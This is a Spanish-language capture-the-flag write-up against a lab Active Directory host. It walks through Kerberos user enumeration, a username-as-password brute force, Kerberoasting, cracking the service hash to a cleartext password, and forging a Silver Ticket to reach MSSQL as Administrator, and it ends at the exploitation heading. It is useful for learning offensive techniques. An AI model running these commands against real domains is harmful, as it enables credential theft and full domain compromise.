
# Reconocimiento

```shell
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.129.8.117 -oG allPorts
```

```shell
[*] IP Address: 10.129.8.117
[*] Open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49668,49675,49676,49701,49704,56405
```

```shell
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49668,49675,49676,49701,49704,56405 -sCV 10.129.8.117 -oN targeted
```

```shell
nxc smb 10.129.8.117
```

```shell
[*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
```

## LDAP

Verificar el dominio a través de LDAP
```shell
ldapsearch -x -H ldap://10.129.8.117 -s base namingcontexts
```

Enumerar el dominio encontrado
```shell
ldapsearch -x -H ldap://10.129.8.117 -b "DC=scrm,DC=local"
```

No encontramos nada relevante en este caso

## HTTP
Encontramos una web en la que podemos seleccionar los servicios IT y en una imagen encontramos un nombre de usuario llamado `ksimpson` el cual podemos validar usando `KERBEROS`

Nos lo guardamos en un archivo y usamos [[KERBRUTE]] para validarlo
```shell
kerbrute userenum -d scrm.local --dc 10.129.8.117 users
```

```ad-hint
[+] VALID USERNAME:   ksimpson@scrm.local
```

## KERBEROS
### Enumeración de usuarios validos
enumeraremos mas usuarios validos a demas de el anteriormente encontrando usando [[KERBRUTE]]
```shell
kerbrute userenum -d scrm.local --dc 10.129.8.117 /usr/share/wordlists/kerberos_enum_userlists/A-ZSurnames.txt
```

Obteniendo como resultado
```ad-hint
[+] VALID USERNAME:   ASMITH@scrm.local
[+] VALID USERNAME:   JHALL@scrm.local
[+] VALID USERNAME:   KSIMPSON@scrm.local
[+] VALID USERNAME:   KHICKS@scrm.local
[+] VALID USERNAME:   SJENKINS@scrm.local
```


Nos lo guardamos en un fichero `users`
Al tener una lista de usuarios validos hay que probar *SIEMPRE* a hacer un `AS-REP ROAST Attack`

#### AS-REP ROAST Attack
Usaremos la herramienta de [[IMPACKET]]
```shell
impacket-GetNPUsers -no-pass -usersfile users scrm.local/(
```

En este caso no obtendremos los TGT de los usuarios


### User as Password
Probamos a usar el nombre de usuario como contraseña usando la herramienta de [[KERBRUTE]]
```shell
kerbrute bruteuser --dc 10.129.8.117 -d scrm.local users ksimpson
```

En este caso vemos que el usuario `ksimpson` utiliza su nombre como contraseña

```ad-hint
ksimpson::ksimpson
```

Una vez con estas credenciales validas probaremos un `KERBEROASTING Attack`

#### KERBEROASTING Attack
Usaremos la herramienta de  [[IMPACKET]]
```shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson
```

En caso de que nos este dando error al operar mediante `NTLM` por que puede ser que este deshabilitada podemos operar por `KERBEROS` con la misma herramienta pero usando

```shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
```

Llegando a encontrar un `SPN` con el nombre `sqlsvc`
A continuación probaremos a obtener el `TGS (Ticket Granting Service)` 

Usaremos la misma herramienta que anteriormente
```shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -request
```

Obteniendo un hash *TGS* el cual vamos a intentar crackear con [[JOHN THE RIPPER]]
```shell
john -w /usr/share/wordlists/rockyou.txt hash
```

Obteniendo el hash en texto claro con el valor 
```ad-hint
Pegasus60
```

Correspondiendo a la contraseña del usuario `sqlsvc`

```ad-hint
sqlvc::Pegasus60
```


## Microsoft SQL Server
Como hemos visto a la horade hacer el reconocimiento con con [[NMAP]] el puerto `1433` se encuentra habilitado así que probaremos a conectarnos al servicio usando la herramienta [[IMPACKET]]
```shell
impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.129.8.117
```

No nos deja conectarnos, ya que la autenticación NTLM esta deshabilitada, así que volveremos a probar conectarnos con Kerberos

#### TGT 
Probaremos a generar con las credenciales validas un `TGT (Ticket Granting Ticket)` con el cual nos podamos autenticar usando la herramioenta [[IMPACKET]] crearemos el tticket
```shell
impacket-getTGT scrm.local/sqlsvc:Pegasus60
```

Se nos genera un archivo `sqlscv.ccache`

Nos lo tenemos que guardar en la variable `KRB5CCNAME`
```shell
export KRB5CCNAME=sqlsvc.ccache
```

Ahora podemos probar de nuevo a conectarnos al servicio de *MSSQL* usando la autenticación por kerberos
```shell
impacket-mssqlclient dc1.scrm.local -k
```

Pero en este caso seguimos sin tener acceso

Probaremos a generar el `TGT` con el otro usuario que tenemos `ksimpson`
```shell
impacket-getTGT scrm.local/ksimpson:ksimpson
```

Guardamos el archivo `.ccache` en la variable
```shell
export KRB5CCNAME=ksimpson.ccache
```

Y probaremos de nuevo a realizar la conexion
```shell
impacket-mssqlclient dc1.scrm.local -k
```

Volviendo a no poder conectarnos

#### Silver Ticket Attack
Requisitos:
- NTLM Hash
- Domain SID
- SPN

Generaremos un `TGS (Ticket Grantiong Service)` para el usuario Administrador y así podernos conectar con el AD.

Primero obtendremos el NTLM Hash, usando un generador online, el cual incluimos la contraseña del usuario `sqlsvc` obteniendo el hash NTLM
```ad-info
B999A16500B87D17EC7F2E2A68778F05
```

Lo pasaremos a minúsculas para que no nos de ningún error
```shell
echo "B999A16500B87D17EC7F2E2A68778F05" | tr '[A-Z]' '[a-z]'
```

```ad-info
b999a16500b87d17ec7f2e2a68778f05
```


Segundo obtendremos el SID del dominio usando la [[IMPACKET]]
```shell
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
```

Obteniendo el Domain SID
```ad-info
S-1-5-21-2743207045-1827831105-2542523200
```

Tercero obtenemos el SPN con la herramienta [[IMPACKET]]
```shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
```

Usaremos la herramienta [[IMPACKET]] para obtener el *Silver Ticket*
```shell
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local
```

Se nos genera un fichero `Administrator.ccache` el cual lo tenemos que guardar en la variable
```shell
export KRB5CCNAME=Administrator.ccache
```

Pudiendo ahora conectarnos al servicio MSSQL
```shell
impacket-mssqlclient dc1.scrm.local -k
```


### Explotación Microsoft SQL Server
